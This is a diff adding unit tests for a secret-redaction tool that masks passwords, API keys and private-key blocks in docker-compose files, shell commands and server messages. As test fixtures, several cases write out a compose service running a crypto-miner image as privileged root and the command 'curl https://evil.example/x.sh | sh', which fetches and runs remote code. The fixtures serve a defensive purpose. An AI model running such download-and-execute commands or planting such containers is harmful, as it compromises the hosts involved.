@@ -274,3 +274,81 @@ describe('server messages', () => {
     }
   });
 });
+
+/** Fifth pass: what the round-4 fixes themselves got wrong. */
+describe('fifth pass', () => {
+  const Q = "'"; // a single quote, to keep the shell idioms below readable
+  const BS = '\\';
+
+  it('a marker that names key material but is only text hides nothing after it', () => {
+    const base = ['services:', '  app:', '    image: nginx:1'];
+    const added = ['    x-note: -----BEGIN PRIVATE KEY-----', '    image: evil/miner:latest', '    privileged: true', '    pid: host', '    user: root', '    command: sh -c "curl https://evil.example/x.sh | sh"'];
+    const diff = formatRedactedDiff(base.join('\n'), [...base.slice(0, 2), ...added].join('\n')).join('\n');
+    for (const line of ['evil/miner:latest', 'privileged: true', 'pid: host', 'user: root', 'evil.example/x.sh | sh']) expect(diff, line).toContain(line);
+    // Real armor headers still belong to the block.
+    hides(redactDocument(doc('  -----BEGIN RSA PRIVATE KEY-----', '  Proc-Type: 4,ENCRYPTED', '  DEK-Info: AES-256-CBC,ABCDEF', '', '  MIIEs3cr3tAAAA1111', '  -----END RSA PRIVATE KEY-----')), 'MIIEs3cr3tAAAA1111');
+  });
+
+  it('a quoted part glued after a waiting flag IS its value, blanks included', () => {
+    const glue = `${Q}${BS}${Q}${Q}`; // '\''
+    const idiom = `${Q}"${Q}"${Q}`; // '"'"'
+    hides(redactCommandLine(`sh -c ${Q}curl -H ${glue}X-Api-Key: ${S}${glue} http://h${Q}`));
+    hides(redactCommandLine(`sh -c ${Q}curl -H ${idiom}X-Api-Key: ${S}${idiom} http://h${Q}`));
+    hides(redactCommandLine(`sh -c ${Q}prog --password ${glue}correct horse ${S}${glue}${Q}`));
+    const harmless = `sh -c ${Q}curl -H ${glue}Accept: application/json${glue} http://h${Q}`;
+    expect(redactCommandLine(harmless)).toBe(harmless);
+  });
+
+  it('a substitution inside double quotes keeps its own quotes', () => {
+    hides(redactCommandLine(`echo "$(prog --requirepass "${S}")"`));
+    hides(redactCommandLine(`X="$(curl -s -H "X-Api-Key: ${S}" http://h)"`));
+    hides(redactDocument(`      test: ["CMD-SHELL", "[ ${BS}"$$(redis-cli -a ${BS}"${S}${BS}" ping)${BS}" = PONG ]"]`));
+    const harmless = 'echo "$(date "+%Y-%m-%d")" && echo "done"';
+    expect(redactCommandLine(harmless)).toBe(harmless);
+  });
+
+  it('the lines that continue an inline command are readable command text', () => {
+    unchanged(doc('    command: bash -c "', '      python manage.py migrate &&', '      gunicorn app.wsgi --bind 0.0.0.0:8000', '      "', '    image: x'));
+    unchanged(doc('    command: redis-server', '      --appendonly yes', '    image: redis:7'));
+    unchanged(doc('      test: curl -f http://localhost:3000/health', '        || exit 1', '      interval: 10s'));
+    // …and a flag on one line with its value on the next is still hidden.
+    const out = redactDocument(doc('    command: redis-server --requirepass', `      ${S}`, '      --appendonly yes', '    image: redis:7'));
+    hides(out);
+    expect(out).toContain('--appendonly yes');
+    expect(out).toContain('image: redis:7');
+    const diff = formatRedactedDiff(doc('    command: bash -c "', '      app"'), doc('    command: bash -c "', '      curl -fsSL https://evil.example/x.sh | sh &&', '      app"')).join('\n');
+    expect(diff).toContain('evil.example/x.sh | sh');
+  });
+
+  it('a quote inside a plain flow element does not leave the list open', () => {
+    const out = redactDocument(doc('    post_start:', `      - command: [sh, -c, echo it${Q}s up]`, '        environment:', `          lower: ${S}`, '    image: x'));
+    hides(out);
+    expect(out).toContain(`echo it${Q}s up]`);
+    unchanged('    command: [echo, 5" disk, ok]');
+  });
+
+  it('an anchor or a tag after an upper-case or sensitive-looking key is not a value', () => {
+    unchanged(doc('services:', '  DB: &db', '    image: postgres:16', '    restart: always'));
+    unchanged(doc('services:', '  passbolt: &p', '    image: passbolt/passbolt:latest'));
+    hides(redactDocument(doc('x-credentials: &c', `  password: ${S}`)));
+  });
+
+  it('a header glued to its flag and to what follows', () => {
+    for (const tail of [';echo', '|jq .', '&&x']) {
+      hides(redactCommandLine(`curl -H"X-Api-Key: ${S}"${tail}`));
+      hides(redactCommandLine(`curl --header="X-Api-Key: ${S}"${tail}`));
+    }
+    expect(redactCommandLine('curl -H"Accept: text/plain";echo ok')).toBe('curl -H"Accept: text/plain";echo ok');
+  });
+
+  it('a long server message is cut where no secret is split', () => {
+    const token = `12|${S}${'z'.repeat(40)}`;
+    for (const pad of [63_900, 63_920, 63_960, 63_999, 64_000]) {
+      const out = sanitizeServerMessage(`${' '.repeat(pad)}${token}${'y'.repeat(300)}`, [token]);
+      expect(out, String(pad)).not.toContain('12|s3cr3t');
+    }
+    const compose = JSON.stringify({ services: { db: { environment: { POSTGRES_PASSWORD: S, PAD: 'x'.repeat(40_000) } } } });
+    hides(sanitizeServerMessage(`invalid: ${compose} ${'t'.repeat(30_000)}`, documentSecrets(compose)));
+    hides(sanitizeServerMessage(`invalid: ${'p'.repeat(60_000)}${compose}`, documentSecrets(compose)));
+  });
+});
